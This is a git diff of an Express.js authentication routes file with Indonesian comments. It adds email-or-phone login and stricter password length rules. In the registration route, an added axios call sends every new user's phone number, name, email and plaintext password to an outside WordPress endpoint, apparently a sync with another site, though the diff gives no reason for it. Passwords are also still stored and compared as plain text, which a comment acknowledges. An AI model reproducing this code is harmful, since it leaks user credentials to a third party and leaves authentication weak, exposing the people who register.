@@ -15,6 +15,9 @@ const multer = require('multer');
 const secretKey = process.env.JWT_SECRET;
 const { PDFDocument } = require('pdf-lib');
 const { Op } = require("sequelize");
+const axios = require('axios');
+const https = require('https');
+const agent = new https.Agent({ family: 4 });
 
 
 // Setup folder upload
@@ -114,6 +117,12 @@ router.put('/update-password', verifyToken, async (req, res) => {
     return res.status(400).json({ message: 'NoHP, password lama, dan password baru wajib diisi' });
   }
 
+  if (newPassword.length < 8) {
+    return res.status(400).json({ 
+      message: 'Password baru minimal 8 karakter' 
+    });
+  }
+
   try {
     // Cari user berdasarkan nohp (primary key)
     const user = await User.findOne({ where: { nohp } });
@@ -124,7 +133,7 @@ router.put('/update-password', verifyToken, async (req, res) => {
 
     // Cek apakah password lama sesuai dengan password yang ada di database
     if (user.password !== oldPassword) {
-      return res.status(401).json({ message: 'Password lama tidak cocok' });
+      return res.status(400).json({ message: 'Password lama tidak cocok' });
     }
 
     // Update password dengan password baru
@@ -323,75 +332,91 @@ router.post('/tryagain', async (req, res) => {
 });
 
 router.post(
-  '/login', 
+  '/login',
   [
-    body('nohp')
+    body('identifier')
       .trim()
-      .isMobilePhone('id-ID')
-      .withMessage('Nomor HP tidak valid')
+      .notEmpty()
+      .withMessage('Email atau NoHP wajib diisi')
       .escape(),
     body('password')
-      .isLength({ min: 6 })
-      .withMessage('Password minimal 6 karakter')
+      .isLength({ min: 8 })
+      .withMessage('Password minimal 8 karakter')
       .escape()
   ],
   async (req, res) => {
-  const errors = validationResult(req);
-  if (!errors.isEmpty()) {
-    return res.status(400).json({ error: errors.array()[0].msg });
-  }
-  const { nohp, password } = req.body;
-
-  try {
-    // Cari pengguna berdasarkan NIP
-    const users = await UsersModel.findOne({ where: { nohp: nohp } });
-    
-    // Jika pengguna tidak ditemukan
-    if (!users) {
-      return res.status(404).json({
-        error: "User not found"
-      });
+    const errors = validationResult(req);
+    if (!errors.isEmpty()) {
+      return res.status(400).json({ error: errors.array()[0].msg });
     }
 
-    // Jika password cocok
-    if (users.password === password) {
-      const token = jwt.sign(
-        { nohp: users.nohp }, // Payload yang dikodekan dalam token
-        secretKey, // Secret key untuk menandatangani token
-        { expiresIn: '3h' } // Token akan kadaluarsa dalam 1 jam
-      );
+    const { identifier, password } = req.body;
 
-      res.cookie("cookieToken", jwt.sign({ nohp: users.nohp, nama: users.nama, role: users.role, profilePic: users.profilePic }, secretKey), { httpOnly: true, maxAge: 3 * 60 * 60 * 1000});
+    try {
+      let users;
 
-      return res.status(200).json({
-        nohp: users.nohp,
-        role: users.role,
-        nama: users.nama,
-        profilePic: users.profilePic,
-        token,
-        metadata: "Login success"
-      });
-    } else {
-      // Jika password salah
-      return res.status(401).json({
-        error: "Invalid password"
-      });
+      // Deteksi apakah input email atau nohp
+      const isEmail = /\S+@\S+\.\S+/.test(identifier);
+
+      if (isEmail) {
+        users = await UsersModel.findOne({ where: { email: identifier } });
+      } else {
+        users = await UsersModel.findOne({ where: { nohp: identifier } });
+      }
+
+      if (!users) {
+        return res.status(404).json({ error: "User not found" });
+      }
+
+      // Cek password (sebaiknya pakai bcrypt.compare, ini aku biarkan plain text sesuai kode awalmu)
+      if (users.password === password) {
+        const token = jwt.sign(
+          { nohp: users.nohp, email: users.email },
+          secretKey,
+          { expiresIn: '3h' }
+        );
+
+        res.cookie(
+          "cookieToken",
+          jwt.sign(
+            {
+              nohp: users.nohp,
+              email: users.email,
+              nama: users.nama,
+              role: users.role,
+              profilePic: users.profilePic
+            },
+            secretKey
+          ),
+          { httpOnly: true, maxAge: 3 * 60 * 60 * 1000 }
+        );
+
+        return res.status(200).json({
+          nohp: users.nohp,
+          email: users.email,
+          role: users.role,
+          nama: users.nama,
+          profilePic: users.profilePic,
+          token,
+          metadata: "Login success"
+        });
+      } else {
+        return res.status(401).json({ error: "Invalid password" });
+      }
+    } catch (error) {
+      console.error(error);
+      res.status(500).json({ error: "An internal server error occurred" });
     }
-  } catch (error) {
-    console.error(error); // Menampilkan error di server
-    res.status(500).json({
-      error: "An internal server error occurred"
-    });
   }
-});
+);
 
 router.post(
   '/register',
   [
     body('nohp')
       .trim()
-      .isMobilePhone('id-ID')
-      .withMessage('Nomor HP tidak valid')
+      .notEmpty()
+      .withMessage('No Hp wajib diisi')
       .escape(),
     body('nama')
       .trim()
@@ -399,8 +424,8 @@ router.post(
       .withMessage('Nama wajib diisi')
       .escape(),
     body('password')
-      .isLength({ min: 6 })
-      .withMessage('Password minimal 6 karakter')
+      .isLength({ min: 8 })
+      .withMessage('Password minimal 8 karakter')
       .escape(),
     body('email')
       .trim()
@@ -444,6 +469,17 @@ router.post(
       // Jangan return password ke frontend
       const userData = user.toJSON();
       delete userData.password;
+
+      await axios.post(
+        `https://yantotanjung.com/wp-json/sts/v1/register`,
+        {
+          nohp: nohp,
+          nama: nama,
+          email: email,
+          password: password
+        },
+        { httpsAgent: agent }
+      );
 
       res.status(201).json({ message: 'User berhasil dibuat', user: userData });
     } catch (err) {
